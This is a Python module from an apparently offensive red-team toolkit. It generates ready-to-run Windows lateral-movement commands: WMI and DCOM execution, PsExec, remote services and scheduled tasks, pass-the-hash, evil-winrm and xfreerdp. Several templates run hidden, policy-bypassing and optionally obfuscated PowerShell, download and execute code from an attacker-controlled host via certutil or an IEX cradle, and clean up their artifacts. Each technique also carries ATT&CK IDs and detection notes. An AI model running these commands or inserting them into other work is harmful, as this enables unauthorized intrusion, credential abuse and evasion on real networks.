"""
Lateral movement template generator.
Returns ready-to-run commands for moving laterally across Windows environments.
For use in authorized red team exercises only.
"""
import random
import string
from dataclasses import dataclass, field

from .obfuscate import ps_tick_marks

SUPPORTED_TECHNIQUES = (
    "wmi_exec",
    "wmi_exec_cmd",
    "psremoting",
    "psexec",
    "dcom_mmc",
    "smb_svc",
    "schtask_remote",
    "pass_the_hash_wmi",
    "winrm_ps",
    "evil_winrm",
    "xfreerdp_cmd",
)


@dataclass
class LateralResult:
    command: str
    technique: str
    notes: str
    techniques: list[str] = field(default_factory=list)
    risk: str = "HIGH"
    detections: list[str] = field(default_factory=list)


def _rand_name(length: int = 6) -> str:
    return "".join(random.choices(string.ascii_lowercase, k=length))


def _nt_only(hash_nt: str) -> str:
    return hash_nt.split(":")[-1] if ":" in hash_nt else hash_nt


# ── Techniques ────────────────────────────────────────────────────────────────

def _wmi_exec(target: str, command: str, username: str, password: str, hash_nt: str,
              obfuscate: bool, lhost: str, lport: int) -> LateralResult:
    cmd = (
        f"$p='{password}';"
        f"$s=ConvertTo-SecureString $p -AsPlainText -Force;"
        f"$c=New-Object System.Management.Automation.PSCredential('{username}',$s);"
        f"Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList '{command}' -ComputerName {target} -Credential $c"
    )
    if obfuscate:
        cmd = ps_tick_marks(cmd)
    return LateralResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{cmd}\"",
        technique="wmi_exec",
        notes="Requires WMI port 135 open. No output returned — use a callback or write to a file share.",
        techniques=["T1047"],
        risk="HIGH",
        detections=[
            "Event 4688 (process creation) for wmiprvse.exe spawning unusual child on target",
            "WMI Activity Log (Event 5857) — provider load from remote IP",
            "Sysmon Event 19/20/21 (WMI subscription / consumer / binding)",
        ],
    )


def _wmi_exec_cmd(target: str, command: str, username: str, password: str, hash_nt: str,
                  obfuscate: bool, lhost: str, lport: int) -> LateralResult:
    cmd = f'wmic.exe /node:"{target}" /user:"{username}" /password:"{password}" process call create "{command}"'
    return LateralResult(
        command=cmd,
        technique="wmi_exec_cmd",
        notes="Legacy but widely supported. May trigger AV on wmic.exe usage.",
        techniques=["T1047"],
        risk="HIGH",
        detections=[
            "Process creation: wmic.exe with /node:remote and /user: arguments",
            "EDR: wmic.exe spawning cmd.exe on remote host",
        ],
    )


def _psremoting(target: str, command: str, username: str, password: str, hash_nt: str,
                obfuscate: bool, lhost: str, lport: int) -> LateralResult:
    cmd = (
        f"$p='{password}';"
        f"$s=ConvertTo-SecureString $p -AsPlainText -Force;"
        f"$c=New-Object System.Management.Automation.PSCredential('{username}',$s);"
        f"Invoke-Command -ComputerName {target} -Credential $c -ScriptBlock {{{command}}}"
    )
    if obfuscate:
        cmd = ps_tick_marks(cmd)
    return LateralResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{cmd}\"",
        technique="psremoting",
        notes="Requires WinRM (5985/5986). Use -UseSSL for encrypted transport.",
        techniques=["T1021.006"],
        risk="HIGH",
        detections=[
            "WinRM listener accepting connections (Event 91 in Microsoft-Windows-WinRM)",
            "Event 4624 logon type 3 from PowerShell on target",
            "Sysmon Event 1: wsmprovhost.exe spawning command shells",
        ],
    )


def _psexec(target: str, command: str, username: str, password: str, hash_nt: str,
            obfuscate: bool, lhost: str, lport: int) -> LateralResult:
    tmp = r"C:\Windows\Temp\psx.exe"
    cmd = (
        f'certutil -urlcache -split -f http://{lhost}:{lport}/PsExec64.exe {tmp} && '
        f'{tmp} \\\\{target} -u {username} -p {password} -d -s CMD /c "{command}" && '
        f"del /f /q {tmp}"
    )
    return LateralResult(
        command=cmd,
        technique="psexec",
        notes=(
            f"PsExec64.exe served from http://{lhost}:{lport}/. "
            "PsExec creates a named pipe service — high EDR visibility. "
            "Use -d for non-interactive, -s for SYSTEM."
        ),
        techniques=["T1021.002", "T1569.002"],
        risk="HIGH",
        detections=[
            "Event 7045 (service install) on target named PSEXESVC",
            "Named pipe \\pipe\\PSEXESVC created on target",
            "certutil.exe outbound download from staging server",
        ],
    )


def _dcom_mmc(target: str, command: str, username: str, password: str, hash_nt: str,
              obfuscate: bool, lhost: str, lport: int) -> LateralResult:
    cmd = (
        f"$d=[System.Activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application','{target}'));"
        f"$d.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,\"/c {command}\",'7')"
    )
    if obfuscate:
        cmd = ps_tick_marks(cmd)
    return LateralResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{cmd}\"",
        technique="dcom_mmc",
        notes="DCOM via MMC20.Application (port 135). Does not require SMB. No service creation artifact. Auth is from calling process token.",
        techniques=["T1021.003"],
        risk="HIGH",
        detections=[
            "RPC traffic to port 135 followed by DCOM activation events",
            "mmc.exe spawning cmd.exe on target (rare in normal use)",
            "Sysmon Event 1: cmd.exe with parent mmc.exe",
        ],
    )


def _smb_svc(target: str, command: str, username: str, password: str, hash_nt: str,
             obfuscate: bool, lhost: str, lport: int) -> LateralResult:
    svcname = _rand_name(6)
    cmd = (
        f'sc.exe \\\\{target} create {svcname} binPath= "cmd.exe /c {command}" && '
        f"sc.exe \\\\{target} start {svcname} && "
        f"ping -n 3 127.0.0.1 && "
        f"sc.exe \\\\{target} delete {svcname}"
    )
    return LateralResult(
        command=cmd,
        technique="smb_svc",
        notes="Requires admin share access (445). Service start is fire-and-forget — no output. Artifacts: service creation event (7045).",
        techniques=["T1021.002", "T1569.002"],
        risk="HIGH",
        detections=[
            "Event 7045 (service install) on target",
            "Event 7036/7000 (service state change) for short-lived service",
            "SMB ADMIN$ share writes via Event 5145",
        ],
    )


def _schtask_remote(target: str, command: str, username: str, password: str, hash_nt: str,
                    obfuscate: bool, lhost: str, lport: int) -> LateralResult:
    taskname = _rand_name(8)
    cmd = (
        f'schtasks /Create /S {target} /U {username} /P {password} /TN {taskname} /TR "cmd.exe /c {command}" /SC ONCE /ST 00:00 /F && '
        f"schtasks /Run /S {target} /U {username} /P {password} /TN {taskname} && "
        f"ping -n 3 127.0.0.1 && "
        f"schtasks /Delete /S {target} /U {username} /P {password} /TN {taskname} /F"
    )
    return LateralResult(
        command=cmd,
        technique="schtask_remote",
        notes="Creates, runs, then deletes the task. Artifacts: task scheduler event (4698).",
        techniques=["T1053.005"],
        risk="HIGH",
        detections=[
            "Event 4698 (scheduled task created)",
            "Event 4699 (scheduled task deleted) in close proximity",
            "Network: SMB write to Tasks share on target",
        ],
    )


def _pass_the_hash_wmi(target: str, command: str, username: str, password: str, hash_nt: str,
                       obfuscate: bool, lhost: str, lport: int) -> LateralResult:
    cmd = (
        f"IEX (New-Object Net.WebClient).DownloadString('http://{lhost}:{lport}/Invoke-WMIExec.ps1');"
        f"Invoke-WMIExec -Target {target} -Username {username} -Hash {_nt_only(hash_nt)} -Command \"{command}\""
    )
    if obfuscate:
        cmd = ps_tick_marks(cmd)
    return LateralResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{cmd}\"",
        technique="pass_the_hash_wmi",
        notes=(
            f"Invoke-WMIExec.ps1 served from http://{lhost}:{lport}/ (from Kevin Robertson's WMIExec). "
            "Hash format: 32-char hex NT hash only (no LM prefix needed). NTLM auth bypasses Kerberos."
        ),
        techniques=["T1550.002", "T1047"],
        risk="HIGH",
        detections=[
            "Event 4624 logon type 3 with NTLM auth from workstation",
            "Sysmon Event 1: powershell.exe with web download cradle",
            "AMSI: Invoke-WMIExec function name in script block log",
        ],
    )


def _winrm_ps(target: str, command: str, username: str, password: str, hash_nt: str,
              obfuscate: bool, lhost: str, lport: int) -> LateralResult:
    cmd = (
        f"$p='{password}';"
        f"$s=ConvertTo-SecureString $p -AsPlainText -Force;"
        f"$c=New-Object System.Management.Automation.PSCredential('{username}',$s);"
        f"$sess=New-PSSession -ComputerName {target} -Credential $c -Authentication Negotiate;"
        f"Invoke-Command -Session $sess -ScriptBlock {{{command}}};"
        f"Remove-PSSession $sess"
    )
    if obfuscate:
        cmd = ps_tick_marks(cmd)
    return LateralResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{cmd}\"",
        technique="winrm_ps",
        notes="Requires WinRM (5985/5986). -Authentication Negotiate supports NTLM fallback.",
        techniques=["T1021.006"],
        risk="HIGH",
        detections=[
            "WinRM listener accepting connections (Event 91)",
            "wsmprovhost.exe spawning script blocks on target",
            "PSSession creation with non-default authentication scheme",
        ],
    )


def _evil_winrm(target: str, command: str, username: str, password: str, hash_nt: str,
                obfuscate: bool, lhost: str, lport: int) -> LateralResult:
    bare_user = username.split("\\")[-1] if "\\" in username else username
    if hash_nt:
        cmd = f"evil-winrm -i {target} -u {bare_user} -H {_nt_only(hash_nt)}"
    else:
        cmd = f"evil-winrm -i {target} -u {bare_user} -p {password}"
    return LateralResult(
        command=cmd,
        technique="evil_winrm",
        notes="Linux tool. Install: gem install evil-winrm. Provides interactive PS shell. Supports PTH, Kerberos, SSL.",
        techniques=["T1021.006", "T1550.002"],
        risk="HIGH",
        detections=[
            "evil-winrm-specific User-Agent string in HTTP(S) traffic to WinRM listener",
            "wsmprovhost.exe spawning numerous .NET assemblies in rapid succession",
            "WinRM logs on target showing unusual session lifetime",
        ],
    )


def _xfreerdp_cmd(target: str, command: str, username: str, password: str, hash_nt: str,
                  obfuscate: bool, lhost: str, lport: int) -> LateralResult:
    bare_user = username.split("\\")[-1] if "\\" in username else username
    if hash_nt:
        auth = f"/pth:{_nt_only(hash_nt)}"
    else:
        auth = f"/p:{password}"
    cmd = f"xfreerdp /v:{target} /u:{bare_user} {auth} /cert-ignore /dynamic-resolution /drive:share,/tmp +clipboard"
    return LateralResult(
        command=cmd,
        technique="xfreerdp_cmd",
        notes="Linux tool. RDP lateral movement (port 3389). /drive mounts /tmp as a share for file transfer. Restricted Admin mode required for PTH (/pth).",
        techniques=["T1021.001"],
        risk="HIGH",
        detections=[
            "RDP logon with logon type 10 (Event 4624) from unusual source",
            "RDP-tcp connection from non-corporate subnet",
            "Disk redirection events (TS Gateway logs)",
        ],
    )


# ── Public API ─────────────────────────────────────────────────────────────────

_DISPATCH = {
    "wmi_exec": _wmi_exec,
    "wmi_exec_cmd": _wmi_exec_cmd,
    "psremoting": _psremoting,
    "psexec": _psexec,
    "dcom_mmc": _dcom_mmc,
    "smb_svc": _smb_svc,
    "schtask_remote": _schtask_remote,
    "pass_the_hash_wmi": _pass_the_hash_wmi,
    "winrm_ps": _winrm_ps,
    "evil_winrm": _evil_winrm,
    "xfreerdp_cmd": _xfreerdp_cmd,
}


def generate_lateral(
    technique: str,
    target: str = "TARGET_HOST",
    command: str = "whoami",
    username: str = "DOMAIN\\USER",
    password: str = "PASS",
    hash_nt: str = "",
    obfuscate: bool = True,
    lhost: str = "192.168.1.100",
    lport: int = 8080,
) -> LateralResult:
    if technique not in _DISPATCH:
        raise ValueError(f"Unknown technique '{technique}'. Supported: {', '.join(SUPPORTED_TECHNIQUES)}")
    return _DISPATCH[technique](target, command, username, password, hash_nt, obfuscate, lhost, lport)
